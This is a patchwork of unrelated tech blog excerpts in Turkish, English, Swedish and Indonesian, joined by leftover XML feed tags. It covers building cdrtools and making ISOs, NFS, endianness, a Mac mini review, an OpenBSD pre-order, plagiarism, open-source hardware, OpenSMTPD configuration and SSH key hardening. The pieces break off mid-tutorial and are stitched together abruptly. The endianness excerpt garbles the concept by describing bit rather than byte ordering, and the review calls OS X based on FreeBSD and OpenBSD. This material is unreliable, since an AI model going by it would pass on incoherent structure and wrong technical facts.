öncelikle şu adresten paketleri bulabilirsiniz. 
ftp://ftp.berlios.de/pub/cdrecord/ 
ancak bu adres zaman içerisinde çökerse diye kendi sitemede direk kendi kurup denediğim paketi ekliyorum. 
cdrtools-3.00.tar.gz 
dosyayı indirdikten sonra tar.gz yi açıyoruz. 
komut satırında indirdiğiniz bu dosyanın olduğu yere geçin sonra 
tar zxvf cdrtools-3.00.tar.gz
tar’ı açtıktan sonra dosyanın içine giriyoruz. 
cd cdrtools-3.00
bu pakette configure e ihtiyaç duyulmuyor ancak detaylı açıklamayı içindeki INSTALL dosyasından okuyabilirsiniz. 
make
bunu yaptıktan sonra  
install
komutlarını sırasıyla giriyorsunuz eğer bir hata çıkmazsa 
cd /opt/schily/ 
buranın altına yüklenmiş demektir. 
şimdi gelelim mkisofs ile ISO oluşturmaya. En basit haliyle bir iso dosyası oluşturmak için 
mkisofs -o dosyalar.iso klasör
 şeklinde bir iso oluşturabilirsiniz. 
mesela az önce açtığınız tar dosyasını iso yapmaya karar verdiniz. 
klasörün bulunduğu yere gittikten sonra, bende Downloads altında duruyor. 

cd Downloads/
mkisofs -o cdrtools-3.00.iso cdrtools-3.00

şöyle bir çıktı alacaksınız..

  <summary><![CDATA[First, we need to know what is NFS ? NFS is a network file system something like a distributed file system protocol that allowing user on a client computer to access files over network.  For Example : we have few NFS server here and we want to know  how to see all exported file system from unix server using a command line linux  We can using showmount command to see the mount information from NFS server.  Example we have a NFS server named : media10 and the ip address : 10.100.100.1

  <title><![CDATA[The end of a SunRay era]]></title>
  <summary><![CDATA[For 7 years we have been running a Sun server with SunRay thin clients (see 42: SunRay Server installation).  However, this week the server failed in a major way (power on but nothing at all on the screen and no hard disk activity).

  

So it is being retired. To an extent we had been expecting to do this. We now have one son already away from home and using a Macbook when he is around. We hope another will go to university in October. Also I am using a laptop much of the time. So the server was no longer making economic sense simply in terms of electricity for only 2 or 3 users.

  

However, everything has been organised around that server in terms of shared storage, email, printing, ... So a lot of reconfiguring in progress. We are going to have a linux file server (a simple Network Attached Storage box). 

  

I am going to change the firewall to provide more WiFi integration and am thinking of going the whole hog and moving it to OpenBSD as the most secure firewall option there is.

  

I am also going to be shifting our main domain to google for email (most users have been using gmail to collect the mail from the server anyway).]]></summary>

  <summary><![CDATA[Dear reader,  I am writing here about Endian-ness, which is a bit-storing pattern to hold data. The more details are given below.  Java is Big-Endian which is a network order. That's why Java is portable. The term Endian or Endian-ness refers to the ordering of bits for a representation of a larger data item as  stored in external memory (or, sometimes, as sent on a serial network connection).  Big-Endian: 01234.. (Left to Right bit ordering). |------------>>>>>  Little-Endian: ..43210 (Right to Left bit ordering). <<<<<------------|  Endian | First byte(lowest address) | Middle bytes  |    Last byte(highest address) | Example     Big    | Most_Significant             |    ...         |    Least_Significant          | Number written on paper in Roman. Little | Least_Significant             |    ...         |    Most_Significant         | Arithmetic calculation order (carry propagation).  The simple forms are:     increasing numeric significance with increasing memory addresses (or increasing time), known as little-endian, and     decreasing numeric significance with increasing memory addresses (or increasing time), known as big-endian.   Giving below examples on Endianness and operating systems on these architectures:  Little-endian (operating systems with architectures on Little Endian):         FreeBSD on x86, x86-64, and Itanium.     Linux on x86, x86-64, Alpha, Itanium, ARM and UniCore32.     Mac OS X on x86, x86-64.     NetBSD on x86, x86-64, Itanium, etc.     OpenBSD on x86, x86-64, Itanium, etc.         Solaris on x86, x86-64, PowerPC.         Windows on x86, x86-64, Alpha, PowerPC, MIPS and Itanium.  Big-endian (operating systems with architectures on Big Endian):     AIX on POWER.     FreeBSD on PowerPC and SPARC.     HP-UX on Itanium and PA-RISC.     Linux on SPARC, POWER, PowerPC, ARMEB and Xtensa.     Mac OS on PowerPC and 680x0.         NetBSD on PowerPC, SPARC, etc.     OpenBSD on PowerPC, SPARC, etc.     MVS and DOS/VSE on ESA/390, and z/VSE and z/OS on z/Architecture.

  <title><![CDATA[Recension Mac mini]]></title>
  <summary><![CDATA[Jag har skaffat mig en Mac Mini och tänkte här dela med mig av mina erfarenheter hittills. 
Som Linuxanvändare sedan tio år har jag aldrig tidigare funderat särskilt mycket på Mac och hur OSX fungerar.Jag har dock alltid tyckt att det har varit snyggt. 
Jag ska också försöka ge en så rättvis bild av skillnaderna mellan Mac och Ubuntu 10.04 LTS som är det jag har kört de senaste åren. framförallt med fokus på musik och filmproduktion på de båda plattformarna. 
Första kontakten med Mac OS 
Som kuriosa kan jag berätta att mitt allra första kontakt med Mac os,  ja faktiskt med datorer överhuvudtaget var någon gång 1984 eller 85. En klasskompiss pappa hade fått en sprillans ny Apple Mac med svartvit skärm. datorn var importerad från USA och kostade över 40 000 kr . Min klasskompis satt på kvällarna och skapade scheman som fick plats i plånboken och som han sedan sålde för en femma styck. Sist jag hälsade på honom hade han fortfarande kvar denna dator, nu med uppgraderat ramminne till hela 1 mb om jag minns rätt 
Gammal Mac med svartvit skärm 
Jag har visserligen kommit i kontakt med Mac OS en gång till sedan dess. 
Det jag minns från den gången var att man för att få ut en diskett skulle dra diskettikonen till papperskorgen, någon knapp för att trycka ut disketten fanns inte. Jag vet att jag funderade på hur man skulle bära sig åt om det blev strömavbrott 
Jag minns också att musen bara hade en knapp som man var tvungen att hålla in när man klickade på en meny i något program. Apple hade även ett eget nätverksgränssnitt som hette Appletalk vill jag minnas och att själva datorn såg ut som en Pizzakartong. 
På Mac Minin är det annorlunda, här kan man använda sitt vanliga PC tangentbord och sin vanliga skärm om man så önskar, men man kan naturligtvis även välja Apples egna prylar men då svider det rejält i plånboken. 
Det är just detta med priset som är det stora problemet för många som funderar på att gå över till Apples produkter, iallafall historiskt så har de legat väldigt högt i pris jämfört med en ordinär pc med samma hårdvara men nu för tiden ligger de ungefär i linje med vad en motsvarande pc kostar. 
Det är också svårare att hitta riktigt bra erbjudande på Apples produkter då priserna verkar sättas centralt av Apple, som ju är de ända som tillverkar Apple produkter, och inte av återförsäljarna. 
En 27 tums” Mac skärm kostar exempelvis otroliga 9995:- medan en motsvarande Samsung eller annat märke ligger kring 2-5000:-  Dock har Apple skärm något som kallar Thunderbolt och som gör det möjligt att enkelt koppla ihop flera skärmar och andra prylar, vilket de är rätt ensamma om att stödja än så länge. 
Ett annat exempel är Apples egna tangentbord, det finns två varianter, med eller utan sladd, bägge kostar 5-700 kr medan ett motsvarande Pc-tangentbord kostar 3-400 kr. 
Mac mini finns i flera olika versioner och den billigaste med I-5 cpu, delad Intel grafik, 500 Gb SSD disk  och 2 Gb ram kostar ca 5500:- 
Jag valde den lite dyrare varianten med ATI radeon grafikkort och 4 gb ram och betalade 7500 kr Anledningen var att den här modellen går att bygga ut minnet mer och att den hade separat grafik kort, även CPUn gick att uppgradera. 
Någon dvd spelare följer inte med men man kan köpa till detta om man vill. 
Mer info om de båda modellerna hittar ni här http://www.Apple.com/se/Macmini/specs.html 
OSX 10.7.3 Lion 
OSX Lion 
OSX Lion 10.07 är det operativsystem som följer med dagens Mac mini 
Dock 
Längst ner på skärmen hittar vi något Apple kallar Dock. Här hittar vi Finder som är Apples motsvarighet till Nautilus i Linux eller Utforskaren i Windows. Launchpad med vilken man snabbt kan komma åt program som inte finns i Dockan exempelvis Itunes, Papperskorgen och några andra program. Till denna drar man de program som man använder ofta. 
Man hittar även något Apple kallar Mission Control vilket är ett snabbt sätt att få överblick över vilka program som är igång. Mission Control innehåller även flera skrivbord precis som i Gnome och KDE och något Apple kallar Dashboard. Dashboard innehåller flera småprogram som bl.a en miniräknare, en  valutaomvandlare, ett anteckningsblock och en väderpresentatör. Man kan även lägga in ytterligare småprogram om man så önskar 
Medföljande program 
Apples operativsystem har alltid varit bra för musik och filmproduktion och är så fortfarande, mycket tack vare de medföljande programmen. 
Garageband 
Garageband 
Garageband är ett program för att på ett enkelt sätt skapa egen musik med hjälp av sk Apple-loopar vilket är små förinspelade musiksnuttar som man kan arrangera som man vill och få till att bli en hel låt. 
Programmet är enkelt att använda men saknar några funktioner för proffsbruk exempelvis så är antalet loopar och instrument som följer med något begränsat. 
Att få det att fungera med en midi-keybord var mycket enkelt, bara att plugga in den och börja spela . 
Vill man ha fler funktioner, Appleloopar och instrument så kan man istället köpa till programmet Logic Pro från Apple Store för ca 1400 :-. men Garageband är ett program som duger bra för hobbybruk eller en enklare hemmastudio. 
Itunes 
Itunes är ett mycket populärt program där man både kan lyssna på musik och köpa låtar i form av DRM skadade MP3 filer och annat, jag har inte själv prövat detta ännu och vet inte hur bra det fungerar. Itunes lägger även upp dina egna mp3 filer och andra ljud i listor  så att de snabbt kan hittas. 
Imovie 
Imovie är ett program för att redigera videofilmer från exempelvis en videokamera. Programmet är enkelt att komma igång med och har gott om effekter för att göra filmer med professionell look om man så önskar. 
Imovie 
Att lägga in en filmsnutt i full HD på 64 mb tar ett par  minuter men cpu fläkten börjar snurra på väldigt och 
tempen ökar från normala 45-60 grader till uppemot 100 grader medan man gör detta, för att sedan sjunka igen. 
Så se därför till att datorn har bra ventilation när du gör detta och ha den inte i knäet. 
Man kan exempelvis plocka bort ljudet från den ursprungliga filmen och ersätta den med ett egna ljud eller musik man har skapat själv. 
Imovie, Garageband, Logic Pro och Itunes är väl integrerade med varandra och fungerar riktigt bra ihop. 
Röstkommandon och talsyntes 
Att kunna styra datorn med hjälp av rösten har länge varit alla datornördars våta dröm. Sedan ett par versioner tillbaka är detta möjligt i MacOSX. 
För att det överhuvudtaget ska fungera behövs en bra mikrofon och mycket tålamod, du måste nämligen lära datorn att känna igen din röst och när detta är gjort fungerar det hjälpligt men inte helt perfekt. 
Exempelvis kan datorn beroende på inställning i röstprogrammet börja starta program av sig självt. I andra fall lyder den inte alls när man säger till den vad den ska göra, beroende på att den reagerar på alla möjliga ljud, exempelvis slammer från köket eller ljud från TVn. 
Man kan undvika detta genom att ställa in den så att man är tvungen att hålla ner exempelvis esc tangenten för att få den att lyda.Röstkommandon fungerar bäst på engelska och det finns flera röster att välja bland, däribland några svenska röster, både manliga och kvinnliga. 
Talsyntes finns även det inbyggt i MacosX, dels i form av att den kan läsa upp text man har skrivit själv och dels som ett kommando i kommandopromten, den senare kan till och med sjunga tvåstämmigt om man vet hur man gör. 
En annan lite udda och rolig sak med talsyntesen är att när ett program hänger sig, för sånt inträffar även i de bästa av världar så säger datorrösten ”Excuse me, the program ”valfritt program” needs your attention” 
Jag kommer att beskriva detta utförligare i en separat artikel längre fram i vår. 
Programinstallation App store och nerladdade program 
Att installera program på en mac skiljer sig från både Linux och Windows. Apple har något som heter Appstore där man väljer ut ett program som man vill installera och sedan klickar man på köp. Appstore kan man säga motsvarar programcentralen(eller synaptic i Ubuntu debian debianmint eller Yast om man kör Suse-Linux eller Opensuse) men här finns alltså både program och spel som kostar och såna som är gratis. 
Oavsett om de är ett gratisprogram eller ett som kostar så behöver man ett Itunes konto kopplat till sitt kreditkort för att det ska fungera. 
Detta kan ställa till det om man inte har aktiverat internetbetalningar hos sin bank vilket jag fick erfara men när väl detta var gjort gick det smidigt att få det att fungera. Efter att ha frågat en försäljare som stod och demonstrerade Apples produkter hos Mediamarkt så fick jag reda på att det var detta som behövdes göras. 
Jag lyckades inte hitta info om att man behövde göra detta, varken på Apples hemsida eller när jag Googlade på hur man gör för att köpa program via Appstore, vilket jag tycker är svagt av Apple, som ju har som affärsidé att det ska vara så enkelt som möjligt. 
Det går naturligtvis även att installera program som man laddar ner själv och de vanligaste öppna programmen som Firefox, Libreoffice och Gimp finns även i Mac version. 
Att installera nerladdade program är enkelt 
Om vi exempelvis vill installera programmet Scribus och har hämtat ner filen Scribus 1.4.0 så börjar vi med att klicka på den vilket öppnar en ruta och vi ser då en fil som heter Scribus 1.4.0.app eller liknande.  Denna app-fil drar vi med hjälp av musen till mappen program och vipps så installeras programmet. 
Vill vi avinstallera programmet drar vi filen Scribus1.4.0 till papperskorgen och programmet avinstalleras. 
Detta är väldigt enkelt när man vet om hur man gör men hade jag inte vetat om detta hade det nog tagit ett bra tag innan jag kom på att man skulle göra på detta vis. 
Högt ställda krav 
I Linuxvärlden förväntar man sig inte att saker som skrivare, digitalkameror, webbkameror, midi-keyboards och skanners fungerar på en gång när man pluggar in dem men man blir glatt överraskad när de gör så, i Apples värld är kraven högre ställda och saker fungerar för det mesta mycket bra, det är också lättare att hitta saker som fungerar då många produkter har en Mac symbol på förpackningen. 
Sammanfattning och slutsats 
Sammanfattningsvis får ni här mina erfarenheter av att arbeta med musik och filmproduktion på  Ubuntu och på OSX 
Som jag sa inledningsvis så har jag kört Ubuntu sedan ett par år tillbaka och då jag är musikintresserad så har jag skaffat mig ett midikeyboard. 
För att få detta att fungera med Linux så krävs ett program som kallas Jack som man använder för att koppla ihop keyboarden med musikprogrammen och att man installerar en sk realtidskärna. 
Man måste också veta om man ska använda sig av Alsa eller Pulsaudio som ljudserver och ställa in programmen efter detta. 
Vidare behöver man göra ändringar i en textfil tillhörande Jackd 
Musikprogrammen som följer med Linux är vart och ett riktigt bra men så fort man börjar koppla ihop dem uppstår problem som att programmen blir utkickade  av Jackd eller att de överhuvudtaget inte går att starta för att ljudservern är upptagen. 
Vissa program känner inte alls av att man har Jackd igång. Ibland försvinner ljudet helt och hållet och datorn måste startas om 
  
På Macen var det bara att ansluta keyboarden och så var jag igång och kunde börja spela, fördel Mac alltså. 
  
Hur går det då att redigera filmer i Linux? 
Linux har en hel del programvaror för filmredigering men det är ingen som är i samma klass som Imovie när det gäller enkelhet. 
Jag har bl.a prövat Kdenlive, Kino, Cinelerra, Openshot, Open movie editor och Avidemux och med min HD kamera var det bara två av dessa som överhudtaget kunde importera filmen.I det ena programmet kunde jag klppa och redigera ihop en film av flera filmsnuttar men när jag sedan skulle rendera den gick jag bet, på vilken codec jag skauule använda och upplösning och en massa andra inställningar som påverkade resultatet. Det blev visserligen en film men den blev randig. 
I det andra programmet som lyckades importera min högupplösta mpeg4 film så fungerade endast ljudet, själva filmen hackade så det inte gick att se den alls. 
Jag provade att importera samma filer i Imovie på Mac mini datorn och efter någon minut hade den importerat filmen och det fungerade utan att hacka och med bra ljud. 
Därmed inte sagt att det fungerar lika bra för alla, Imovie är något begränsat när det gäller filformat som stöds. Endast fyra olika finns att välja på, däribland Apples eget Quicktime-format. 
Fördelar med Mac mini och Mac os X 
 

Mac OSX är baserat på FreeBSD och OpenBSD vilket gör det i grunden till ett säkert operativsystem.
Enkelheten i gränssnittet.
Program som känns genomtänkta och lätta att arbeta med.
Programmen fungerar väl ihop.
Tar liten plats på skrivbordet
Hårdvara och operativsystem kommer från samma företag vilket gör att operativsystemet och hårdvaran fungerar väldigt bra ihop.
Finns väldigt få virus om ens något alls till Apples plattform

Nackdelar med Mac Mini  och Mac os X 
 

Os x kan visserligen installeras på en vanlig pc som har rätt hårdvara men det är inte lagligt enligt Apples syn på saken.
Begränsat urval av modeller. Det finns inga riktigt billiga modeller att välja på.
I stort sett alla program kostar en väldig massa pengar men å andra sidan fungerar de för det mesta till det de var avsedda för.
Hårdvaran blir gammal ganska fort då de inte är så enkla att uppgradera p.g.a. det lilla formatet.
Kan bli svårt och dyrt om man exempelvis måste rengöra cpu fläkten på Mac minin från damm eller byta ut den när garantin har gått ut eftersom det endast är Apple som har reservdelar till dessa datorer.
Har ingen cd /dvd splare/brännare så en sådan måste köpas  separat om man vill installera från cdskiva och inte har tillgång till en extra Windows eller Mac dator med spelare
Betalning via nätet måste vara aktiverat och kopplat till ett fungerande kreditkort, även för att installera gratisappar via app store.

Fördelar med Ubuntu och andra Linuxvarianter 

Kan köras på vanlig PC hårdvara.
Programmen är helt kostnadsfria och kan laddas ner från nätet helt lagligt.
Ett enda program för att uppdatera hela systemet.
Klippa och klistra med mittenknappen på musen- något som jag saknar i osX
Går att ändra utseende på och få precis som man vill om man så önskar:
Mycket bra säkerhet, normalanvändaren har inga administrativa rättigheter, och kan därför varken råka ut för eventuella virus (om sådana mot förmodan skulle finnas) eller råka ändra i viktiga systemfiler av misstag.

Nackdelar med Ubuntu och andra Linuxvarianter och dess program 
 

Saknar fungerande integration mellan olika program, exempelvis mellan Jackd, Rosegarden, LMMS, och Rakarack för att ta några exempel.
Kräver flera timmars konfigurerade innan det kanske fungerar men kan hänga sig precis när som helst.
Kräver specialistkunskaper för såna saker som att koppla in ett midikeyboard och få ljud från det.
Ingen motsvarighet till Appleloopar utan använder sig av sk ljudfonter eller sf2 filer med oftast ganska dålig ljudkvalité. Sf2 och midi är två förlegade standarder som sedan länge har ersatts av mjukvaruinstrument och loopar, något som Linux helt saknar.
Alldeles för många irrelevanta inställningsmöjligheter, varför ska jag som användare exempelvis måsta  välja mellan Pulseaudio eller Alsa. Detta val borde programmet göra  med automatik år 2012 som användare är man endast intresserad av funktionen i programmet inte det tekniska bakom.
Programmen är oftast inte så genomtänkta och saknar viktiga funktioner som gör de lätta att komma igång att arbeta med.
Kräver att man ändrar i textfiler för att få Jackd att fungera. Detta  borde ske med automatik år 2012
Inget gemensamt gränssnitt för de olika programmen utan alla ser helt olika ut och tar därför mycket tid att lära om sig sedan man vant sig vid ett sätt att arbeta på.
Vissa saker måste fortfarande göras från kommandoprompten, exempelvis ställa in Jackd så det fungerar med lämpliga inställningar för aktuell hårdvara. Något som programmet själv borde klara av att fixa år 2012. Varför ska man överhuvud taget vara tvungen att ändra i en textfil i ett program med ett grafiskt gränssnitt?

Således blir slutsatsen att vill du arbeta med ljud eller film och ha något som för det mesta fungerar bra till detta ändamål: – köp då en Mac. 
Vill du däremot kunna spela datorspel så är utbudet för både Mac och Linux något begränsat jämfört med Windows även om det finns några spel lätt tillgängliga via mac store och programvarucentralen/symnaptic . 
Har du däremot redan  en Windowsdator som  du är allmänt trött på och vill prova något annat, och du endast tänker använda datorn till att ordbehandla, skriva epost, surfa på nätet och kolla på film via Youtube eller likande  vill sätta upp en webb eller filserver på hemma-nätverket. 
installera då Ubuntu eller någon annan Linuxdist. 
Apples Mac OS X har sina fördelar och nackdelar likväl som Linux har sina, bägge är bra men till olika saker.

  <title><![CDATA[Förboka OpenBSD 5.1 redan nu]]></title>
  <summary><![CDATA[Theo de Raadt meddelade idag att det går att förboka OpenBSD 5.1 som kommer att släppas den 1 maj 2012. Som vanligt brukar dem som förbokar få sina skivor några dagar tidigare än alla andra. Det är också viktigt att köpa för pengarna går till utvecklarna så att projektet kan fortsätta. 
It is that time again.  I have just activated pre-orders for CDs, 
tshirts, and posters for the 5.1 release — due May 1. 
http://openbsd.org/orders.html 
At the same time, I am making available the song that will come out 
with the release (hmm, it is still moving out to the ftp mirrors at 
the moment, but that is ok).  The song and details of it are linked 
from: 
http://openbsd.org/lyrics.html 
And there is something else.  Five years ago we made available an 
Audio CD that contained 5 years of songs.  Well, we have made a new 
audio CD since enough new songs have been made.  It is not very 
expensive, so please consider buying this as well when you place any 
order.  It has some rather nice liner notes.  Had some great fun 
coming up with the cover for that CD: 
http://openbsd.org/images/cdaudio2.gif 
I’d also like you remind you that Michael Lucas new “SSH Mastery” book 
is also now available, in case anyone was waiting for the 5.1 release 
to place one order. 
http://openbsd.org/books.html#book9 
Please consider purchasing these items and/or making a donation, since 
this is a very important revenue source which keeps the project going.

  <title><![CDATA[Generasi Penjiplak]]></title>
  <summary><![CDATA[Meniru boleh, menjiplak jangan. Generasi terlahir digital, hidup dalam budaya tiru-meniru dan jiplak-menjiplak yang kental. Bagaimana melihat fenomena ini? 

Tiga anak muda Indonesia memberikan kuliah umum di sebuah perguruan tinggi di Bandung. Usia mereka begitu belia, baru menginjak bangku SMP. Ada pembuat jejaring sosial mirip Facebook, pembuat antivirus, dan permainan edukasi di ponsel. Berbicara di hadapan pakar-pakar TI, mahasiswa, dan pelajar-pelajar sekolah menengah, tentu cukup membanggakan. 
Sayangnya seperti judul sebuah film, reality bites. Eforia yang ada ternyata semu belaka. Sebagian generasi muda ini bahkan terjerat tindakan tidak patut, yaitu plagiarisme. Mengapa begitu? Ternyata klaim dua belia ini palsu belaka. Situs jejaring sosial yang dibangun, ternyata menggunakan engine ciptaan orang lain. Begitupun dengan anti virus, ternyata itu adalah buatan programmer lain. 
Plagiarisme atau penjiplakan, adalah mengambil ide atau karya pihak lain, dan mengakuinya sebagai buatan sendiri. Penjiplakan tergolong pencurian intelektual. Di lingkungan akademis, tindakan ini jelas terlarang. Di lingkup lebih luas, misalnya pengembangan perangkat lunak, tentu perbuatan yang tercela. Tiru-meniru memang jamak dilakukan, tapi bukan mengklaim hasil karya orang lain.  
Penjiplakan memiliki pro dan kontra tersendiri. Banyak yang menentang, tapi tidak sedikit yang mendukung. Di tengahnya kaum oportunis dengan aksi ambil untung. Rujukan yang sering disorot adalah China, negara yang getol membuat produk tiruan. Ekonomi dan teknologi China maju pesat, melalui kemampuannya meniru dan mengembangkan produk-produk bangsa lain. 
Muncul pula polemik, sejauh mana suatu software dapat diklaim sebagai buatan sendiri? Dalam pembuatan perangkat lunak, begitu banyak bagian yang terlibat. Mulai dari engine, komponen, library, unit, modul, dan seterusnya. Berasal dari vendor atau pihak ketiga. Kontribusi programmer boleh jadi minimal. Ibarat juru masak, asalkan resepnya orisinal, tidak masalah mengklaim itu sebagai karya sendiri. Tentu pula, mengakui dan mematuhi klausul dari pencipta lain. 
Di era sekarang ini, adalah lumrah saling berbagi sumber daya oleh banyak pihak. Aliran kode sumber terbuka atau open source menjadi sangat populer. Namun tentu saja rawan tindakan plagiarisme. Suatu produk biasanya disertai lisensi, berisi syarat-syarat tertentu. Misalnya GPL, LGPL, AGPL, Artistic, dan OpenBSD. Sayangnya, membaca ketentuan di situ tidaklah mudah. Pemakainya bingung, pembuat program pun belum tentu paham. 
Pedoman hukum tentang hak cipta ada di UU No 19 Tahun 2002. Definisi hak cipta, pencipta dan ciptaan ada di situ. Prakteknya, di tengah lautan informasi kita mudah lalai dan abai terhadap hak cipta. Siapapun berpotensi menjadi pelaku sekaligus korban pelanggaran hak cipta. Misalnya melakukan copy + paste, apapun itu, tanpa menyertakan kreditasi. Padahal, kreditasi adalah bentuk pengakuan terhadap hasil karya. 
Generasi yang lahir sejak era 90-an, sering digolongkan sebagai digital native. Era di mana teknologi digital mulai berkembang. Mereka dianggap lebih memahami konsep-konsep teknologi informasi, karena terpapar langsung sejak usia dini. Generasi ini sejak balita sudah bersinggungan dengan komputer dan Internet. Berbeda dengan generasi sebelumnya, disebut digital immigrant, yang membutuhkan adaptasi lebih lanjut. 
Nah, kita perlu khawatir bila generasi terlahir digital ini juga lalai dalam menyikapi hak cipta. Seperti halnya kasus dua belia di atas. Tanpa penyadaran sejak dini, didasari aktivitas mereka yang tinggi di dunia digital, penjiplakan akan kian marak dan masif. Kita tentu tak ingin, generasi mendatang dipenuhi oleh mereka-mereka yang enggan bekerja keras dan miskin kreativitas. Menjiplak itu murah awalnya, tapi mahal akhirnya. 
Di sisi lain, kegemaran media dan sejumlah kalangan membuat eforia semu patut dikritisi. Banyak contoh karya-karya asli anak bangsa sebagai inspirator generasi muda berkreasi. Pembuatnya memang tidak lagi di usia belasan. Ketidakjelian pakar-pakar terkait, malah menimbulkan polemik dan cercaan publik. Seperti plesetan slogan sebuah media, terdepan dalam melebaykan.

  <title><![CDATA[Prof. Jazi: Rancangan Hardware Tidak Bebas Diakses Publik]]></title>
  <summary><![CDATA[Pengukuhan Guru Besar Fakultas MIPA UGM Prof. Dr. Jazi Eko Istiyanto, M.Sc  
Inisiatif teknologi informasi sesungguhnya berupa diperolehnya kebijaksanaan (wisdom). Institusi tidak hanya harus memiliki data dan informasi mengenai lingkungan internal maupun eksternalnya, namun lebih dari itu ia harus mampu mengolah data dan informasi tersebut menjadi pengetahuan (knowledge) dan kebijaksanaan, agar setiap keputusan manajemen dan eksekusi tindakan memberikan hasil yang optimal bagi semua pihak. 
Demikian disampaikan Prof. Dr. Jazi Eko Istiyanto, M.Sc di ruang Balai Senat UGM, Rabu (1/2) saat dikukuhkan sebagai Guru Besar Fakultas Matematika dan Ilmu Pengetahuan Alam UGM. Mengucap pidato “Filosofi Open-Source: Software dan Hardware”, Jazi mengungkapkan Open-Source merupakan suatu metode pengembangan perangkat lunak secara bersama-sama oleh banyak orang yang tersebar di berbagai penjuru dunia. Dimana mereka berhak untuk mengunduh, mengembangkan, dan memodifikasi kode sumber untuk kepentingan bersama. 
Metode ini, kata Jazi, berkembang menjadi suatu gerakan yang menghasilkan aplikasi-aplikasi besar, seperti Apache Web Server, Sistim Operasi Linux dengan segala variannya (Debian, FreeBSD, OpenBSD, Ubuntu dll), browser web Firefox, care2x untuk sistim informasi rumah sakit dan lain-lain. “Pengembangan open-source ini memiliki beberapa karakteristik penting dari metode pengembangan perangkat lunak closed-source,” katanya. 
Beberapa karakteristik penting dari pengembangan open-source diantaranya kode sumber (source code) dapat diunduh, dimodifikasi, dan dikembangkan oleh pengguna. Dimana pengguna sebelumnya hanya ditempatkan di sisi konsumen, namun kini ditempatkan juga di sisi pengembang (developer). Selain itu, Programmer tersusun atas programmer inti (core developers), programmer tambahan (peripery developers), dan pelapor bug (bug reporters), yang direkrut sukarela. Bahwa pengembangan dilakukan secara kolaborasi dengan menggunakan media penghubung internet. “Dan sedikit sekali mempergunakan metodologi formal. Fokus pengembangan secara kode terbuka dengan memakai dua hal, yaitu menambah fitur dan melakukan perbaikan terhadap bug yang dilaporkan,” tutur Ketua Jurusan Ilmu Komputer dan Elektronika, FMIPA UGM. 
Ditambahkan Jazi Open Source Hardware (OSH) sedikit berbeda dari Open-Source Software (OSS). Rancangan hardware (khususnya chip), tidak sepenuhnya bebas diakses publik, sebab diperlukan dana riset dalam desain chip dan bahan material hardware tersebut. Meski begitu pada sisi pengguna hardware, desain implementasi chip, baik rancangan skematik maupun source code program pengendali chip, misalnya program mikrokontroler Arduino dapat bebas diakses oleh publik. “OSH merupakan tipe pure open model sehingga dapat menghasilkan produk tanpa melibatkan elemen intellectual Property (IP), dan mayoritas bisnis hardware merupakan kolaborasi antara strategi development dan gabungan antara open-source dan closed-source hardware,” pungkasnya.

  <title><![CDATA[OpenBSD and smtpd]]></title>
  <summary><![CDATA[Finally there is a secure and easy-to-configurate substitute for ”Sendmail”, ”OpenSMTPD”! 
OpenSMTPD (smtpd) first appeared in OpenBSD 4.6 and will probably replace sendmail as the default mail daemon in OpenBSD 5.1. With this in mind, I replased sendmail with smtpd when I upgraded my OpenBSD (4.8 to 5.0) routers/gateways a few weeks ago. Since they only send ”cron” emails there are not much traffic to talk about but it still feels great to finally replace the old dusty Sendmail. 
Here are the steps I went through to get started with smtpd. For a reference see the maual pages at OpenSMTPD.org. 
smtpd is not enabled by default. In order to use it as the system 
mailer, ensure the mail queue is empty, then stop sendmail(8): 
# pkill sendmail 
Modify the current mailwrapper(8) settings by editing /etc/mailer.conf: 
# cat /etc/mailer.conf 
sendmail /usr/sbin/smtpctl 
send-mail /usr/sbin/smtpctl 
mailq /usr/sbin/smtpctl 
makemap /usr/libexec/smtpd/makemap 
newaliases /usr/libexec/smtpd/makemap 
Rebuild the aliases database, and enable the daemon to run at boot: 
# newaliases 
# echo ”sendmail_flags=NO” >> /etc/rc.conf.local 
# echo ”smtpd_flags=” >> /etc/rc.conf.local 
The above parts was all taken from the manuals so here comes the parts that differs depending on the purpose with smtpd. My purpose is to accept outgoing mail from localhost (lo0) only and relay them through my Loopia email account using TLS authentication on port 587. More examples and informations can be found at calomel.org. 
# cat /etc/mail/smtpd.conf 
listen on 127.0.0.1 port 25 
expire 4h 
hostname my.local.domain 
map ”aliases” { source db ”/etc/mail/aliases.db” } 
map ”secrets” { source db ”/etc/mail/secrets.db” } 
accept from local for local alias aliases deliver to mbox 
accept from local for all relay via mailcluster.loopia.se port 587 tls auth ”secrets” 
Since the mailserver uses authentication the username and password is saved in a separate file with restricted permissions. 
# cat /etc/mail/secrets 
mailcluster.loopia.se LOOPIA_USERNAME@mydomain.tld:LOOPIA_PASSWORD 
# chmod 640 /etc/mail/secrets 
# chown root:_smtpd /etc/mail/secrets 
# cd /etc/mail 
# makemap /etc/mail/secrets 
Check the config for errors and start smtpd in the background. 
# smtpd -n 
configuration OK 
# smtpd 
See so it is working by sending an email to a local user or root depending on your  /etc/mail/aliases setup. 
# smtpctl show stats | grep ‘mta.sessions=’ 
# echo ”A test message” | mail -s ”Subject” root 
# smtpctl show stats | grep ‘mta.sessions=’]]></summary>

  <title><![CDATA[Konfigurera SSH för ökad säkerhet]]></title>
  <summary><![CDATA[Konfigurera SSH för ökad säkerhet 
Det finns några steg man bör ta efter att man installerat SSH på ditt system. En kedja är inte starkare än den svagaste länken och gällande SSH är ett svagt lösenord till t.ex. root ett allvarligt hot. 
Det vi skall göra är att skapa ett certifikat och stänga av möjligheten att logga in utan certifikat. Vi skall även kontrollera så att root inte får logga in då det är mycket bättre att använda sudo när administratörsrättigheter behövs. Vidare skall vi stänga ner några krypteringsmetoder som inte anses som fullt så säkra samt öppna upp för visuell identifiering av serverns “fingeravtryck”. 
Skapa nyckel 
Vi väljer att använda en RSA-nyckel på t.ex. 4096 bitar. Öppna ett terminalfönster och skriv in följande: ”’ssh-keygen -t rsa -b 4096”’. 1024 sägs vara tillräckligt säkert men man kan aldrig vara för säker   
johan@johan-laptop:~$ ssh-keygen -t rsa -b 4096 
Generating public/private rsa key pair. 
Du får sedan upp en fråga var du vill spara din nyckel. Har du redan nycklar i id_dsa bör du ange ett annat namn för filen skrivs över annars. Är du nöjd med förlaget tycker du bara retur 
Enter file in which to save the key (/home/johan/.ssh/id_rsa): 
Sedan skall du ange lösenord. Tänk på att blanda stora och små bokstäver samt lägga in tecken och siffror. Längden är dock en mycket viktig faktor så gör det hellre längre än kort och komplext. Gärna en liten mening som hjälper dig att komma ihåg lösenordet utantill eller absolut bäst är att använda t.ex. Keepass för att både skapa slumpmässiga lösenord men även spara dem på ett krypterat och säkert sätt. 
